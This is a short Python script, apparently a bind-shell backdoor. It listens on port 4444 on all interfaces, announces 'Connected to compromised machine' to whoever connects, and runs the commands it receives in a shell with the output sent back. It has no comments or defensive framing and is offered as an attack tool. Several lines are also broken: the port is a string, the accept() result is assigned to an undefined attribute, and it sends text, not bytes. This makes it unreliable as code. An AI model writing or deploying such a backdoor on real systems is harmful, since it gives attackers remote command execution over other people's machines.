import socket, subprocess

host = '0.0.0.0'
port = '4444'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host,port))
s.listen(5)

while True:
    client.address = s.accept()
    client.send("[+]Connected to compromised machine\r\n\r\n>")
    data = client.recv(1024)
    if data:
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        data = proc.stdout.read() + proc.stderr.read()
        client.send(data)
    client.close()